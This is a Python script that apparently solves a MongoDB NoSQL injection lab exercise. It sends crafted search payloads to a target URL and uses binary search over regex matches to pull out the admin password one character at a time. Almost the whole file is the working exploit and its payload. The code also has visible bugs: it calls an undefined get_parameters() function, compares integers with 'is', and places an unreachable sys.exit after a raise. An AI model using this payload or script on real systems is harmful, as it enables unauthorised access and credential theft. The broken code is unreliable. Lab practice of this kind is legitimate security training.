import sys
import requests


def validate_parameter_length():
  """Check that the program is given valid number of arguements

     Args:
       None
     Raises:
       ValueError: If the call to program doesnt have req arguement count 
     Return
       None
  """ 
  if len(sys.argv) is not 2:
    raise ValueError('Incorrect input! Use the following template: python3 mongoDBsolver.py base_url')
    sys.exit(1)
  return sys.argv[1]


ADMIN_KEYWORD: str = "admin"
BASE_URL: str = 'http://' + get_parameters() + '/mongodb/example2/'
ALPHANUMERIC_CHARS: str = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"


def find_next_char(password: str) -> str:
  """Use binary search to perform multiple GET requests to the URL
     until filtering out a single character which is the next 
     character in the password seqeuence.

     Args:
       password: The current computed password
     Raises:
       RequestException: If the request has failed for various reasons
     Return:
       The next password character
  """
  left, right = ALPHANUMERIC_CHARS[:len(ALPHANUMERIC_CHARS)//2], ALPHANUMERIC_CHARS[len(ALPHANUMERIC_CHARS)//2:]
  while 1:
    try:
      resp = requests.get(BASE_URL+"?search=admin%27%20%26%26%20this.password.match(/^" + password + "[" + left + "]" + ".*$/)//+%00")
      resp.raise_for_status()
    except requests.exceptions.RequestException as e:
      print(e)
      sys.exit(1)

    if ADMIN_KEYWORD in resp.text:
      if len(left) is 1:
        password += left
        return left
      left, right = left[:len(left)//2], left[len(left)//2:]
    else:
      if len(right) is 1:
        password += right
        return right
      left, right = right[:len(right)//2], right[len(right)//2:]


def main():
  """Do a simple GET to the base URL to verify that a valid
     IP address was given and we can proceed"""
  try:
    resp = requests.get(BASE_URL)
  except requests.exceptions.RequestException as e:
    print("Couldn't establish a connection to the host, check that the IP provided is correct: " + str(e))
    sys.exit(1)

  """Loop on 1 until we get the final password that is validated by
     performing a GET with the terminating character `$`."""
  password = ""
  while 1:
    password += find_next_char(password)
    print("password: " + password)
    resp = requests.get(BASE_URL+"?search=admin%27%20%26%26%20this.password.match(/^" + password + "*$/)//+%00")
    if ADMIN_KEYWORD in resp.text:
      return password


password = main()
print("The password for this exercise is: " + password)
